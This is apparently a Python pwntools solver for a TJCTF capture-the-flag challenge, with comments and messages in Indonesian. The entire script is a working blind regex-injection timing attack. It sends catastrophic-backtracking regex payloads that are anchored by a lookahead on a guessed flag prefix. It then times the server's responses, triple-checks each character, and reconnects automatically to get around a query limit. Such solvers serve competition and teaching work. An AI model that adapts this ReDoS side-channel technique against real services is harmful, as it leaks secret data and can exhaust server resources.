import time
import string
from pwn import *

HOST = 'tjc.tf'
PORT = 31005

# [OPTIMASI] Urutkan dari yang paling sering muncul di flag CTF
ALPHABET = "_" + string.ascii_lowercase + string.digits + "}" + string.ascii_uppercase + "-!?@#$%^&*()<>.,:;'"

io = None
baseline = 0
threshold = 0
queries = 0

def connect_and_calibrate():
    global io, baseline, threshold, queries
    
    if io:
        try: io.close()
        except: pass
            
    print("\n[*] Menyambung ke server...")
    io = remote(HOST, PORT)
    
    baselines = []
    for _ in range(3):
        io.recvuntil(b"regex> ")
        start = time.time()
        io.sendline(b"^$")
        io.recvuntil(b"ok\n")
        baselines.append(time.time() - start)
        
    baseline = sum(baselines) / len(baselines)
    threshold = baseline + 0.15
    queries = 3
    print(f"[*] Baseline baru: {baseline:.3f}s | Waktu indikator: > {threshold:.3f}s\n")

def send_query(regex):
    global io, queries
    if queries >= 1180:
        print("[!] Mendekati limit query, menyambung ulang otomatis...")
        connect_and_calibrate()

    try:
        io.recvuntil(b"regex> ")
        start_time = time.time()
        io.sendline(regex.encode())
        io.recvuntil(b"ok\n")
        queries += 1
        return time.time() - start_time
    except EOFError:
        print("\n[!] Server memutus koneksi (EOFError). Auto-reconnect...")
        connect_and_calibrate()
        return -1

def solve():
    # [BACKTRACK] Kita mundur ke awalan yang kita yakin benar
    flag = "tjctf{w0rth_th" 
    
    connect_and_calibrate()
    
    while not flag.endswith("}"):
        matched = False
        
        for c in ALPHABET:
            escaped_flag = "".join(["\\" + char if char in "{}[]()^$.|*+?\\" else char for char in (flag + c)])
            regex = f"^(?={escaped_flag})(?:.+|.+)+[^\\x00-\\xff]"
            
            elapsed = send_query(regex)
            if elapsed == -1: elapsed = send_query(regex)
            
            if elapsed > threshold:
                print(f"[*] Mengecek '{c}' (waktu: {elapsed:.3f}s). Verifikasi 1...")
                
                # [TRIPLE VERIFICATION]
                v1 = send_query(regex)
                if v1 == -1: v1 = send_query(regex)
                
                if v1 > threshold:
                    print(f"[*] Verifikasi 1 lolos (waktu: {v1:.3f}s). Verifikasi 2...")
                    v2 = send_query(regex)
                    if v2 == -1: v2 = send_query(regex)
                    
                    if v2 > threshold:
                        flag += c
                        print(f"[+] Flag diperbarui: {flag}")
                        matched = True
                        break
                    else:
                        print(f"[-] False positive di '{c}' pada Verifikasi 2. Melanjutkan...")
                else:
                    print(f"[-] False positive di '{c}' pada Verifikasi 1. Melanjutkan...")
                
        if not matched:
            print(f"\n[!] Gagal menemukan karakter berikutnya.")
            print(f"[!] Hapus 1-2 huruf terakhir dari '{flag}' di dalam skrip, lalu jalankan ulang.")
            break

    if io:
        io.close()
    print(f"\n[🏁] Eksekusi Selesai. Final Flag: {flag}")

if __name__ == "__main__":
    context.log_level = 'error'
    solve()
